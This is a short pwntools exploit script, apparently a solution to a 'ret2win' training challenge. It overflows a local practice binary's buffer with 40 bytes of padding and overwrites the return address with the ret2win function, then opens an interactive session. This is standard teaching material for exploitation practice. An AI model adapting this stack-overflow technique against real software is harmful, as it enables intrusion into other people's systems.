from pwn import *

elf = ELF("./ret2win")
p = process("./ret2win")

payload = b"A"*40
payload += p64(elf.sym['ret2win'])

p.sendline(payload)

p.interactive()
